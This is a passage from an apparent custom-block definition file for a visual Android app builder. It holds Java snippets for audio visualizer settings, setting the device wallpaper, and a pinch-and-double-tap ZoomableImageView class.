linear ) setRadiusMultiplier %d"},{"code":"((CircleVisualizer) %1$s.getChildAt(0)).setStrokeWidth((int) %2$s);","color":"#FFE65100","name":"setStrokeWidth...","typeName":"","palette":"186","type":" ","spec":"%m.view ( linear ) setStrokeWidth %d"},{"code":"","color":"#FFE65100","name":"LineBarVisualizer Methods","typeName":"","palette":"186","type":"h","spec":"Methods of LineBarVisualizer وظائف"},{"code":"((LineBarVisualizer) %1$s.getChildAt(0)).setDensity((int) %2$s);","color":"#FFE65100","name":"setDensity...","typeName":"","palette":"186","type":" ","spec":"%m.view ( linear ) setDensity %d"},{"code":"","color":"#FFE65100","name":"SquareBarVisualizer Methods","typeName":"","palette":"186","type":"h","spec":"Methods of SquareBarVisualizer وظائف"},{"code":"((SquareBarVisualizer) %1$s.getChildAt(0)).setGap((int) %2$s);","color":"#FFE65100","name":"setGap...","typeName":"","palette":"186","type":" ","spec":"%m.view ( linear ) setGap %d"},{"code":"((SquareBarVisualizer) %1$s.getChildAt(0)).setDensity((int) %2$s);","color":"#FFE65100","name":"setDensity......","typeName":"","palette":"186","type":" ","spec":"%m.view ( linear ) setDensity %d"},{"code":"","color":"#FFD81B60","name":"created by arab","typeName":"","palette":"187","type":"h","spec":"created by arab ware channel"},{"code":"final ImageView %1$sImage \u003d new ImageView(%3$s.this);\n%1$sImage.setImageResource(R.drawable.%2$s);\nWallpaperManager %1$s \u003d WallpaperManager.getInstance(getApplicationContext());\ntry {\nBitmap %1$sBM \u003d ((android.graphics.drawable.BitmapDrawable) %1$sImage.getDrawable()).getBitmap();\n%1$s.setBitmap(%1$sBM);\n}\ncatch (Exception g) {\n}","color":"#FFD81B60","name":"fromID","typeName":"","palette":"187","type":" ","spec":"%m.WallpaperManager set from wallpaper from id %m.resource in %m.activity"},{"code":"final ImageView %1$sImage \u003d new ImageView(%3$s.this);\n%1$sImage.setImageBitmap(FileUtil.decodeSampleBitmapFromPath(%2$s, 1024, 1024));\nWallpaperManager %1$s \u003d WallpaperManager.getInstance(getApplicationContext());\ntry {\nBitmap %1$sBM \u003d ((android.graphics.drawable.BitmapDrawable) %1$sImage.getDrawable()).getBitmap();\n%1$s.setBitmap(%1$sBM);\n}\ncatch (Exception g) {\n}","color":"#FFD81B60","name":"fromPath","typeName":"","palette":"187","type":" ","spec":"%m.WallpaperManager set wallpaper from path %s in %m.activity"},{"code":"WallpaperManager %1$s \u003d WallpaperManager.getInstance(getApplicationContext());\ntry {\nBitmap %1$sBM \u003d ((android.graphics.drawable.BitmapDrawable) %2$s.getDrawable()).getBitmap();\n%1$s.setBitmap(%1$sBM);\n}\ncatch (Exception g) {\n}","color":"#FFD81B60","name":"fromImageView","typeName":"","palette":"187","type":" ","spec":"%m.WallpaperManager set wallpaper from ImageView %m.imageview"},{"code":"","color":"#FF4FC3F7","name":"Arab Ware Wallpapers Blocks","typeName":"","palette":"187","type":"h","spec":"Added By Arab Ware"},{"code":"WallpaperManager wallpaperManager \u003d WallpaperManager.getInstance(getApplicationContext());\ntry { \nBitmap bitmap \u003d ((android.graphics.drawable.BitmapDrawable) %1$s.getDrawable()).getBitmap();\nwallpaperManager.setBitmap(bitmap);\n%2$s\n} \ncatch (Exception g) { \ng.printStackTrace();\n%3$s\n}","color":"#FF4FC3F7","typeName":"","name":"set imageview as wallpaper of device","palette":"187","type":"e","spec":"set %m.imageview as wallpaper of device #if no error then","spec2":"else"},{"code":"WallpaperManager myWallpaperManager \u003d WallpaperManager.getInstance(getApplicationContext()); try{ myWallpaperManager.setResource(R.drawable.%1$s); }catch (Exception g) { g.printStackTrace(); }","color":"#FF4FC3F7","name":"wallpaper","typeName":"","palette":"187","type":" ","spec":"set device wallpaper from %m.resource"},{"code":"","color":"#FF00E676","name":"created by arab ware and...","typeName":"","palette":"188","type":"h","spec":"CREATED BY ARAB WARE CHANNEL \u0026 KONGLIS FROM GITHUB"},{"code":"}\n\npublic static class ZoomableImageView extends androidx.appcompat.widget.AppCompatImageView implements GestureDetector.OnGestureListener, GestureDetector.OnDoubleTapListener, ScaleGestureDetector.OnScaleGestureListener {\n\n    private Matrix mCurrentMatrix;\n    private GestureDetector mGestureDetector;\n    private static final String TAG \u003d \"ZoomView\";\n    private ScaleGestureDetector scaleGestureDetector;\n    private PointF mRect \u003d new PointF();\n    private PointF mCurrentZoomPoint \u003d new PointF();\n    private MatrixValueManager matrixValueManager, mImageMatrixManager;\n    private android.os.Handler mHandler \u003d new android.os.Handler();\n    private float mLastPositionY;\n    private float mLastPositionX;\n    private boolean isZooming \u003d false;\n\n    public ZoomableImageView(Context context) {\n        super(context);\n        initaial();\n    }\n\n    @Override\n    public void setImageBitmap(Bitmap bm) {\n        super.setImageBitmap(bm);\n    }\n\n    @Override\n    public void setImageDrawable(Drawable drawable) {\n        super.setImageDrawable(drawable);\n    }\n\n    public ZoomableImageView(Context context, android.util.AttributeSet attrs) {\n        super(context, attrs);\n        initaial();\n    }\n\n    public ZoomableImageView(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n        initaial();\n    }\n\n    private void initaial(){\n        matrixValueManager \u003d new MatrixValueManager();\n        mImageMatrixManager \u003d new MatrixValueManager();\n        setLayerType(LAYER_TYPE_HARDWARE, null);\n        mCurrentMatrix \u003d getImageMatrix();\n        mGestureDetector \u003d new GestureDetector(getContext(), this);\n        scaleGestureDetector \u003d new ScaleGestureDetector(getContext(), this);\n        mGestureDetector.setOnDoubleTapListener(this);\n        this.setOnTouchListener(new OnTouchListener() {\n            @Override\n            public boolean onTouch(View view, final MotionEvent motionEvent) {\n                scaleGestureDetector.onTouchEvent(motionEvent);\n                mGestureDetector.onTouchEvent(motionEvent);\n                return true;\n            }\n        });\n    }\n\n    @Override\n    public void invalidate() {\n        super.invalidate();\n        matrixValueManager.setMatrix(mCurrentMatrix);\n    }\n\n    protected boolean onActionUp() {\n        if (matrixValueManager.getScaleX() \u003c\u003d 1) {\n            zoomAnimation(1.0f);\n        } else {\n            mHandler.post(new Runnable() {\n                @Override\n                public void run() {\n                    adjustPosition();\n                }\n            });\n        }\n        return true;\n    }\n\n    private void adjustPosition() {\n\n        float imgH \u003d (getHeight() - (mImageMatrixManager.getTransitionY() *2)) * matrixValueManager.getScaleY();\n        float mY \u003d (matrixValueManager.getTransitionY() + (mImageMatrixManager.getTransitionY()) * matrixValueManager.getScaleY());\n        float scrollAbleY \u003d (getHeight() - imgH);\n\n        float vH \u003d ((getHeight() * matrixValueManager.getScaleY()) - getHeight()) / 2;\n        float vW \u003d ((getWidth() * matrixValueManager.getScaleX()) - getWidth()) / 2;\n\n        float x \u003d 0, y \u003d 0;\n\n        if (imgH \u003c getHeight()){\n            y \u003d (-vH - matrixValueManager.getTransitionY());\n        } else if (imgH \u003e\u003d getHeight()){\n            if (mY \u003e 0) {\n                y \u003d -mY;\n            } else if (mY \u003c scrollAbleY) {\n                y \u003d scrollAbleY - mY;\n            }\n        }\n\n        float mX \u003d (matrixValueManager.getTransitionX() + (mImageMatrixManager.getTransitionX()) * matrixValueManager.getScaleX());\n        float imgW \u003d (getWidth() - (mImageMatrixManager.getTransitionX() * 2)) * matrixValueManager.getScaleX();\n        float scrollAbleX \u003d (getWidth() - imgW);\n\n        if (imgW \u003c getWidth()){\n            x \u003d (-vW - matrixValueManager.getTransitionX());\n        } else if (imgW \u003e\u003d getWidth()){\n            if (mX \u003e 0) {\n                x \u003d -mX;\n            } else if (mX \u003c scrollAbleX) {\n                x \u003d scrollAbleX - mX;\n            }\n        }\n\n        if (x !\u003d 0 || y !\u003d 0) {\n            moveAnimation(x, y);\n        } else {\n            findCurrentZoomPoint();\n        }\n    }\n\n    private void moveAnimation(final float x, final float y) {\n\n        mHandler.post(new Runnable() {\n            @Override\n            public void run() {\n                mLastPositionY \u003d 0;\n                mLastPositionX \u003d 0;\n                android.animation.PropertyValuesHolder valueY \u003d android.animation.PropertyValuesHolder.ofFloat(\"y\", 0, y);\n                android.animation.PropertyValuesHolder valueX \u003d android.animation.PropertyValuesHolder.ofFloat(\"x\", 0, x);\n                android.animation.ValueAnimator anim \u003d new android.animation.ValueAnimator();\n                anim.setValues(valueX, valueY);\n                anim.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n                    @Override\n                    public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n                        float valueX \u003d (float) animation.getAnimatedValue(\"x\");\n                        float valueY \u003d (float) animation.getAnimatedValue(\"y\");\n                        mCurrentMatrix.postTranslate(valueX - mLastPositionX, valueY - mLastPositionY);\n                        matrixValueManager.setMatrix(mCurrentMatrix);\n                        postInvalidate();\n                        mLastPositionY \u003d valueY;\n                        mLastPositionX \u003d valueX;\n                        if (valueX \u003e\u003d x \u0026\u0026 valueY \u003e\u003d y){\n                            findCurrentZoomPoint();\n                        }\n                    }\n                });\n                anim.setDuration(250);\n                anim.start();\n            }\n        });\n\n    }\n\n    private void move(float x, float y) {\n        mCurrentMatrix.postTranslate(x, y);\n        postInvalidate();\n        mHandler.post(new Runnable() {\n            @Override\n            public void run() {\n                findCurrentZoomPoint();\n            }\n        });\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        canvas.save();\n        canvas.concat(mCurrentMatrix);\n        matrixValueManager.setMatrix(mCurrentMatrix);\n        mImageMatrixManager.setMatrix(getImageMatrix());\n        super.onDraw(canvas);\n        canvas.restore();\n    }\n\n    @Override\n    public boolean onDown(MotionEvent motionEvent) {\n        mRect.set(motionEvent.getX(motionEvent.getPointerCount() -1), motionEvent.getY(motionEvent.getPointerCount() -1));\n        return true;\n    }\n\n    @Override\n    public void onShowPress(MotionEvent motionEvent) {\n\n    }\n\n    @Override\n    public boolean onSingleTapUp(MotionEvent motionEvent) {\n        return false;\n    }\n\n    @Override\n    public boolean onScroll(final MotionEvent motionEvent, final MotionEvent motionEvent1, float v, float v1) {\n        if (!isZooming) {\n            if (!mRect.equals(motionEvent1.getX(), motionEvent1.getY())) {\n                calculatePosition(motionEvent1.getX(), motionEvent1.getY());\n                return true;\n            }\n        }\n        return false;\n    }\n\n    @Override\n    public boolean canScrollHorizontally(int direction) {\n        return matrixValueManager.getScaleX() \u003e 1;\n    }\n\n    @Override\n    public boolean canScrollVertically(int direction) {\n        return matrixValueManager.getScaleY() \u003e 1;\n    }\n\n    private void calculatePosition(float rawX, float rawY){\n        float x \u003d (rawX - mRect.x);\n        float y  \u003d (rawY - mRect.y);\n\n        float mY \u003d (matrixValueManager.getTransitionY() + (mImageMatrixManager.getTransitionY() * matrixValueManager.getScaleY()));\n        float imgH \u003d (getHeight() - (mImageMatrixManager.getTransitionY() * 2)) * matrixValueManager.getScaleY();\n        float scrollAbleY \u003d (getHeight() - imgH);\n        if (imgH \u003e getHeight()){\n            float r \u003d (mY + y);\n            float s \u003d (r - scrollAbleY);\n\n            if (s \u003c 0) {\n                y \u003d 0;\n            }\n\n            if (r \u003e 0) {\n                y \u003d 0;\n            }\n\n        } else {\n            y \u003d 0;\n        }\n\n        float mX \u003d (matrixValueManager.getTransitionX() + (mImageMatrixManager.getTransitionX() * matrixValueManager.getScaleX()));\n        float imgW \u003d (getWidth() - (mImageMatrixManager.getTransitionX() * 2)) * matrixValueManager.getScaleX();\n        float scrollAbleX \u003d (getWidth() - imgW);\n        if ((imgW) \u003e getWidth()){\n            float l \u003d (mX + x);\n            float s \u003d (l - scrollAbleX);\n\n            if (s \u003c 0) {\n                x \u003d 0;\n            }\n\n            if (l \u003e 0) {\n                x \u003d 0;\n            }\n\n        } else {\n            x \u003d 0;\n        }\n\n        mRect.set(rawX, rawY);\n        move(x, y);\n    }\n\n    private void findCurrentZoomPoint() {\n        float _x, _y;\n        //X\n        float imgW \u003d (getWidth() - (mImageMatrixManager.getTransitionX() * 2)) * matrixValueManager.getScaleX();\n        float scrollAbleX \u003d (getWidth() - imgW);\n        if (scrollAbleX \u003c 0) {\n            float mX \u003d ((matrixValueManager.getTransitionX() / matrixValueManager.getScaleX()));\n            float visibleScreenX \u003d (getWidth() / matrixValueManager.getScaleX());\n            float percentX \u003d ((Math.abs(mX)) * 100) / (getWidth() - visibleScreenX);\n            _x \u003d Math.abs(mX) + ((percentX * visibleScreenX) / 100);\n        } else {\n            _x \u003d getWidth() / 2;\n        }\n        //Y\n        float imgH \u003d (getHeight() - (mImageMatrixManager.getTransitionY() * 2)) * matrixValueManager.getScaleY();\n        float scrollAbleY \u003d (getHeight() - imgH);\n        if (scrollAbleY \u003c 0) {\n            float mY \u003d ((matrixValueManager.getTransitionY() / matrixValueManager.getScaleY()));\n            float visibleScreenY \u003d (getHeight() / matrixValueManager.getScaleY());\n            float percentY \u003d ((Math.abs(mY)) * 100) / (getHeight() - visibleScreenY);\n            _y \u003d Math.abs(mY) + ((percentY * visibleScreenY) / 100);\n        } else {\n            _y \u003d getHeight() / 2;\n        }\n        mCurrentZoomPoint.set(_x, _y);\n    }\n\n    @Override\n    public void onLongPress(MotionEvent motionEvent) {\n\n    }\n\n    @Override\n    public boolean onFling(final MotionEvent motionEvent, final MotionEvent motionEvent1, float v, float v1) {\n        return true;\n    }\n\n    @Override\n    public boolean onSingleTapConfirmed(MotionEvent motionEvent) {\n        return false;\n    }\n\n    float mLastScale \u003d 0;\n    public void releaseZoom(){\n        if (matrixValueManager.getScaleX() \u003e 1 || matrixValueManager.getScaleY()\u003e 1) {\n            isZooming \u003d true;\n            mLastScale \u003d 0;\n            final float scale \u003d matrixValueManager.getScaleX();\n            android.animation.ValueAnimator valueAnimator \u003d android.animation.ValueAnimator.ofFloat(scale, 1.0f);\n            valueAnimator.setInterpolator(new android.view.animation.LinearInterpolator());\n            valueAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n                @Override\n                public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n                    float value \u003d (float) animation.getAnimatedValue();\n                    if (value !\u003d scale) {\n                        mCurrentMatrix.setScale(value, value, mCurrentZoomPoint.x, mCurrentZoomPoint.y);\n                        postInvalidate();\n                        if (value \u003d\u003d 1) {\n                            isZooming \u003d false;\n                        }\n                    }\n                }\n            });\n            valueAnimator.setDuration(350);\n            valueAnimator.start();\n        }\n    }\n\n    @Override\n    public boolean onDoubleTap(final MotionEvent motionEvent) {\n        return true;\n    }\n\n    private void zoomAnimation(final float scale) {\n        isZooming \u003d true;\n        android.animation.ValueAnimator valueAnimator \u003d android.animation.ValueAnimator.ofFloat(matrixValueManager.getScaleX(), scale);\n        valueAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n            @Override\n            public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n                float value \u003d (float) animation.getAnimatedValue();\n                mCurrentMatrix.setScale(value, value, mCurrentZoomPoint.x, mCurrentZoomPoint.y);\n                postInvalidate();\n                if (value \u003d\u003d scale) {\n                    mHandler.postDelayed(new Runnable() {\n                        @Override\n                        public void run() {\n                            adjustPosition();\n                        }\n                    }, 100);\n                    isZooming \u003d false;\n                }\n            }\n        });\n        valueAnimator.setDuration(250);\n        valueAnimator.start();\n    }\n\n    @Override\n    public boolean onDoubleTapEvent(MotionEvent motionEvent) {\n        if (motionEvent.getAction() \u003d\u003d MotionEvent.ACTION_UP) {\n            if (matrixValueManager.getScaleX() \u003e 1 || matrixValueManager.getScaleX() \u003e 1) {\n                releaseZoom();\n            } else {\n                mCurrentZoomPoint.set(motionEvent.getX(), motionEvent.getY());\n                zoomAnimation(2.0F);\n            }\n            return true;\n        }\n        return false;\n    }\n\n    @Override\n    public boolean onScale(ScaleGestureDetector scaleGestureDetector) {\n        isZooming \u003d true;\n        float scale \u003d scaleGestureDetector.getCurrentSpan() / scaleGestureDetector.getPreviousSpan();\n        if (matrixValueManager.getScaleX() \u003e\u003d 1) {\n            float focusX \u003d scaleGestureDetector.getFocusX();\n            float focusY \u003d scaleGestureDetector.getFocusY();\n            mCurrentMatrix.postScale(scale, scale, focusX, focusY);\n            postInvalidate();\n            mCurrentZoomPoint.set(focusX, focusY);\n            return true;\n        }\n        return false;\n    }\n\n    @Override\n    public boolean onScaleBegin(ScaleGestureDetector scaleGestureDetector) {\n        mRect.set(scaleGestureDetector.getFocusX(), scaleGestureDetector.getFocusY());\n        return true;\n    }\n\n    @Override\n    public void onScaleEnd(ScaleGestureDetector scaleGestureDetector) {\n        mRect.set(scaleGestureDetector.getFocusX(), scaleGestureDetector.getFocusY());\n        isZooming \u003d false;\n        onActionUp();\n    }\npublic static final class MatrixValueManager {\n\n    float[] floats;\n\n    public void setMatrix(Matrix matrix){\n        floats \u003d new float[9];\n        matrix.getValues(floats);\n    }\n\n    public float getTransitionX(){\n        return floats[Matrix.MTRANS_X];\n    }\n\n    public float getTransitionY(){\n        return floats[Matrix.MTRANS_Y];\n    }\n\n    public float getScaleX(){\n        return floats[Matrix.MSCALE_X];\n    }\n\n    public float getScaleY(){\n        return floats[Matrix.MSCALE_Y];\n    }\n\n}","color":"#FF00E676","name":"library......","typeName":"","palette":"188","type":" ","spec":"library \u003d\u003e put me in more block"},{"code":"","color":"#FF00E676","name":"for activity","typeName":"","palette":"188","type":"h","spec":"for activity...."},{"code":"%1$s \u003d new ZoomableImageView(%2$s.this);\n%1$s.setScaleType(ImageView.ScaleType.FIT_XY);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));","color":"#FF00E676","name":"create ZoomableImageView","typeName":"","palette":"188","type":" ","spec":"create %m.ZoomableImageView in %m.activity"},{"code":"","color":"#FF00E676","name":"for fragment...","typeName":"","palette":"188","type":"h","spec":"for fragment..."},{"code":"%1$s \u003d new ZoomableImageView(getActivity());\n%1$s.setScaleType(ImageView.ScaleType.FIT_XY);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));","color":"#FF00E676","name":"Create New ZoomableImageView fragment","typeName":"","palette":"188","type":" ","spec":"create %m.ZoomableImageView in fragment"},{"code":"%2$s.addView(%1$s);","color":"#FF00E676","name":"show in...","typeName":"","palette":"188","type":" ","spec":"show %m.ZoomableImageView in linear %m.view"},{"code":"%1$s.setImageResource(R.drawable.%2$s);","color":"#FF00E676","name":"setImageFromResource int","typeName":"","palette":"188","type":" ","spec":"%m.ZoomableImageView set image %m.resource"},{"code":"%1$s.setImageResource(getResources().getIdentifier(%2$s, \"drawable\", getPackageName()));","color":"#FF00E676","name":"setImageFromName","typeName":"","palette":"188","type":" ","spec":"%m.ZoomableImageView setImageFromNamr %s"},{"code":"%1$s.setImageBitmap(FileUtil.decodeSampleBitmapFromPath(%2$s, 1024, 1024));","color":"#FF00E676","name":"setImageFromPath","typeName":"","palette":"188","type":" ","spec":"%m.ZoomableImageView setImageFromPath %s"},{"code":"Glide.with(getApplicationContext()).load(Uri.parse(%2$s)).into(%1$s);","color":"#FF00E676","name":"setImageFromUrl","typeName":"","palette":"188","type":" ","spec":"%m.ZoomableImageView setFromUrl %s"},{"code":"","color":"#FF00E676","name":"created by arab ware and...","typeName":"","palette":"188","type":"h","spec":"CREATED BY ARAB WARE CHANNEL \u0026 KONGLIS FROM GITHUB"},{"code":"}\n\npublic static class ZoomableImageView extends androidx.appcompat.widget.AppCompatImageView implements GestureDetector.OnGestureListener, GestureDetector.OnDoubleTapListener, ScaleGestureDetector.OnScaleGestureListener {\n\n    private Matrix mCurrentMatrix;\n    private GestureDetector mGestureDetector;\n    private static final String TAG \u003d \"ZoomView\";\n    private ScaleGestureDetector scaleGestureDetector;\n    private PointF mRect \u003d new PointF();\n    private PointF mCurrentZoomPoint \u003d new PointF();\n    private MatrixValueManager matrixValueManager, mImageMatrixManager;\n    private android.os.Handler mHandler \u003d new android.os.Handler();\n    private float mLastPositionY;\n    private float mLastPositionX;\n    private boolean isZooming \u003d false;\n\n    public ZoomableImageView(Context context) {\n        super(context);\n        initaial();\n    }\n\n    @Override\n    public void setImageBitmap(Bitmap bm) {\n        super.setImageBitmap(bm);\n    }\n\n    @Override\n    public void setImageDrawable(Drawable drawable) {\n        super.setImageDrawable(drawable);\n    }\n\n    public ZoomableImageView(Context context, android.util.AttributeSet attrs) {\n        super(context, attrs);\n        initaial();\n    }\n\n    public ZoomableImageView(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n        initaial();\n    }\n\n    private void initaial(){\n        matrixValueManager \u003d new MatrixValueManager();\n        mImageMatrixManager \u003d new MatrixValueManager();\n        setLayerType(LAYER_TYPE_HARDWARE, null);\n        mCurrentMatrix \u003d getImageMatrix();\n        mGestureDetector \u003d new GestureDetector(getContext(), this);\n        scaleGestureDetector \u003d new ScaleGestureDetector(getContext(), this);\n        mGestureDetector.setOnDoubleTapListener(this);\n        this.setOnTouchListener(new OnTouchListener() {\n            @Override\n            public boolean onTouch(View view, final MotionEvent motionEvent) {\n                scaleGestureDetector.onTouchEvent(motionEvent);\n                mGestureDetector.onTouchEvent(motionEvent);\n                return true;\n            }\n        });\n    }\n\n    @Override\n    public void invalidate() {\n        super.invalidate();\n        matrixValueManager.setMatrix(mCurrentMatrix);\n    }\n\n    protected boolean onActionUp() {\n        if (matrixValueManager.getScaleX() \u003c\u003d 1) {\n            zoomAnimation(1.0f);\n        } else {\n            mHandler.post(new Runnable() {\n                @Override\n                public void run() {\n                    adjustPosition();\n                }\n            });\n        }\n        return true;\n    }\n\n    private void adjustPosition() {\n\n        float imgH \u003d (getHeight() - (mImageMatrixManager.getTransitionY() *2)) * matrixValueManager.getScaleY();\n        float mY \u003d (matrixValueManager.getTransitionY() + (mImageMatrixManager.getTransitionY()) * matrixValueManager.getScaleY());\n        float scrollAbleY \u003d (getHeight() - imgH);\n\n        float vH \u003d ((getHeight() * matrixValueManager.getScaleY()) - getHeight()) / 2;\n        float vW \u003d ((getWidth() * matrixValueManager.getScaleX()) - getWidth()) / 2;\n\n        float x \u003d 0, y \u003d 0;\n\n        if (imgH \u003c getHeight()){\n            y \u003d (-vH - matrixValueManager.getTransitionY());\n        } else if (imgH \u003e\u003d getHeight()){\n            if (mY \u003e 0) {\n                y \u003d -mY;\n            } else if (mY \u003c scrollAbleY) {\n                y \u003d scrollAbleY - mY;\n            }\n        }\n\n        float mX \u003d (matrixValueManager.getTransitionX() + (mImageMatrixManager.getTransitionX()) * matrixValueManager.getScaleX());\n        float imgW \u003d (getWidth() - (mImageMatrixManager.getTransitionX() * 2)) * matrixValueManager.getScaleX();\n        float scrollAbleX \u003d (getWidth() - imgW);\n\n        if (imgW \u003c getWidth()){\n            x \u003d (-vW - matrixValueManager.getTransitionX());\n        } else if (imgW \u003e\u003d getWidth()){\n            if (mX \u003e 0) {\n                x \u003d -mX;\n            } else if (mX \u003c scrollAbleX) {\n                x \u003d scrollAbleX - mX;\n            }\n        }\n\n        if (x !\u003d 0 || y !\u003d 0) {\n            moveAnimation(x, y);\n        } else {\n            findCurrentZoomPoint();\n        }\n    }\n\n    private void moveAnimation(final float x, final float y) {\n\n        mHandler.post(new Runnable() {\n            @Override\n            public void run() {\n                mLastPositionY \u003d 0;\n                mLastPositionX \u003d 0;\n                android.animation.PropertyValuesHolder valueY \u003d android.animation.PropertyValuesHolder.ofFloat(\"y\", 0, y);\n                android.animation.PropertyValuesHolder valueX \u003d android.animation.PropertyValuesHolder.ofFloat(\"x\", 0, x);\n                android.animation.ValueAnimator anim \u003d new android.animation.ValueAnimator();\n                anim.setValues(valueX, valueY);\n                anim.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n                    @Override\n                    public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n                        float valueX \u003d (float) animation.getAnimatedValue(\"x\");\n                        float valueY \u003d (float) animation.getAnimatedValue(\"y\");\n                        mCurrentMatrix.postTranslate(valueX - mLastPositionX, valueY - mLastPositionY);\n                        matrixValueManager.setMatrix(mCurrentMatrix);\n                        postInvalidate();\n                        mLastPositionY \u003d valueY;\n                        mLastPositionX \u003d valueX;\n                        if (valueX \u003e\u003d x \u0026\u0026 valueY \u003e\u003d y){\n                            findCurrentZoomPoint();\n                        }\n                    }\n                });\n                anim.setDuration(250);\n                anim.start();\n            }\n        });\n\n    }\n\n    private void move(float x, float y) {\n        mCurrentMatrix.postTranslate(x, y);\n        postInvalidate();\n        mHandler.post(new Runnable() {\n            @Override\n            public void run() {\n                findCurrentZoomPoint();\n            }\n        });\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        canvas.save();\n        canvas.concat(mCurrentMatrix);\n        matrixValueManager.setMatrix(mCurrentMatrix);\n        mImageMatrixManager.setMatrix(getImageMatrix());\n        super.onDraw(canvas);\n        canvas.restore();\n    }\n\n    @Override\n    public boolean onDown(MotionEvent motionEvent) {\n        mRect.set(motionEvent.getX(motionEvent.getPointerCount() -1), motionEvent.getY(motionEvent.getPointerCount() -1));\n        return true;\n    }\n\n    @Override\n    public void onShowPress(MotionEvent motionEvent) {\n\n    }\n\n    @Override\n    public boolean onSingleTapUp(MotionEvent motionEvent) {\n        return false;\n    }\n\n    @Override\n    public boolean onScroll(final MotionEvent motionEvent, final MotionEvent motionEvent1, float v, float v1) {\n        if (!isZooming) {\n            if (!mRect.equals(motionEvent1.getX(), motionEvent1.getY())) {\n                calculatePosition(motionEvent1.getX(), motionEvent1.getY());\n                return true;\n            }\n        }\n        return false;\n    }\n\n    @Override\n    public boolean canScrollHorizontally(int direction) {\n        return matrixValueManager.getScaleX() \u003e 1;\n    }\n\n    @Override\n    public boolean canScrollVertically(int direction) {\n        return matrixValueManager.getScaleY() \u003e 1;\n    }\n\n    private void calculatePosition(float rawX, float rawY){\n        float x \u003d (rawX - mRect.x);\n        float y  \u003d (rawY - mRect.y);\n\n        float mY \u003d (matrixValueManager.getTransitionY() + (mImageMatrixManager.getTransitionY() * matrixValueManager.getScaleY()));\n        float imgH \u003d (getHeight() - (mImageMatrixManager.getTransitionY() * 2)) * matrixValueManager.getScaleY();\n        float scrollAbleY \u003d (getHeight() - imgH);\n        if (imgH \u003e getHeight()){\n            float r \u003d (mY + y);\n            float s \u003d (r - scrollAbleY);\n\n            if (s \u003c 0) {\n                y \u003d 0;\n            }\n\n            if (r \u003e 0) {\n                y \u003d 0;\n            }\n\n        } else {\n            y \u003d 0;\n        }\n\n        float mX \u003d (matrixValueManager.getTransitionX() + (mImageMatrixManager.getTransitionX() * matrixValueManager.getScaleX()));\n        float imgW \u003d (getWidth() - (mImageMatrixManager.getTransitionX() * 2)) * matrixValueManager.getScaleX();\n        float scrollAbleX \u003d (getWidth() - imgW);\n        if ((imgW) \u003e getWidth()){\n            float l \u003d (mX + x);\n            float s \u003d (l - scrollAbleX);\n\n            if (s \u003c 0) {\n                x \u003d 0;\n            }\n\n            if (l \u003e 0) {\n                x \u003d 0;\n            }\n\n        } else {\n            x \u003d 0;\n        }\n\n        mRect.set(rawX, rawY);\n        move(x, y);\n    }\n\n    private void findCurrentZoomPoint() {\n        float _x, _y;\n        //X\n        float imgW \u003d (getWidth() - (mImageMatrixManager.getTransitionX() * 2)) * matrixValueManager.getScaleX();\n        float scrollAbleX \u003d (getWidth() - imgW);\n        if (scrollAbleX \u003c 0) {\n            float mX \u003d ((matrixValueManager.getTransitionX() / matrixValueManager.getScaleX()));\n            float visibleScreenX \u003d (getWidth() / matrixValueManager.getScaleX());\n            float percentX \u003d ((Math.abs(mX)) * 100) / (getWidth() - visibleScreenX);\n            _x \u003d Math.abs(mX) + ((percentX * visibleScreenX) / 100);\n        } else {\n            _x \u003d getWidth() / 2;\n        }\n        //Y\n        float imgH \u003d (getHeight() - (mImageMatrixManager.getTransitionY() * 2)) * matrixValueManager.getScaleY();\n        float scrollAbleY \u003d (getHeight() - imgH);\n        if (scrollAbleY \u003c 0) {\n            float mY \u003d ((matrixValueManager.getTransitionY() / matrixValueManager.getScaleY()));\n            float visibleScreenY \u003d (getHeight() / matrixValueManager.getScaleY());\n            float percentY \u003d ((Math.abs(mY)) * 100) / (getHeight() - visibleScreenY);\n            _y \u003d Math.abs(mY) + ((percentY * visibleScreenY) / 100);\n        } else {\n            _y \u003d getHeight() / 2;\n        }\n        mCurrentZoomPoint.set(_x, _y);\n    }\n\n    @Override\n    public void onLongPress(MotionEvent motionEvent) {\n\n    }\n\n    @Override\n    public boolean onFling(final MotionEvent motionEvent, final MotionEvent motionEvent1, float v, float v1) {\n        return true;\n    }\n\n    @Override\n    public boolean onSingleTapConfirmed(MotionEvent motionEvent) {\n        return false;\n    }\n\n    float mLastScale \u003d 0;\n    public void releaseZoom(){\n        if (matrixValueManager.getScaleX() \u003e 1 || matrixValueManager.getScaleY()\u003e 1) {\n            isZooming \u003d true;\n            mLastScale \u003d 0;\n            final float scale \u003d matrixValueManager.getScaleX();\n            android.animation.ValueAnimator valueAnimator \u003d android.animation.ValueAnimator.ofFloat(scale, 1.0f);\n            valueAnimator.setInterpolator(new android.view.animation.LinearInterpolator());\n            valueAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n                @Override\n                public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n                    float value \u003d (float) animation.getAnimatedValue();\n                    if (value !\u003d scale) {\n                        mCurrentMatrix.setScale(value, value, mCurrentZoomPoint.x, mCurrentZoomPoint.y);\n                        postInvalidate();\n                        if (value \u003d\u003d 1) {\n                            isZooming \u003d false;\n                        }\n                    }\n                }\n            });\n            valueAnimator.setDuration(350);\n            valueAnimator.start();\n        }\n    }\n\n    @Override\n    public boolean onDoubleTap(final MotionEvent motionEvent) {\n        return true;\n    }\n\n    private void zoomAnimation(final float scale) {\n        isZooming \u003d true;\n        android.animation.ValueAnimator 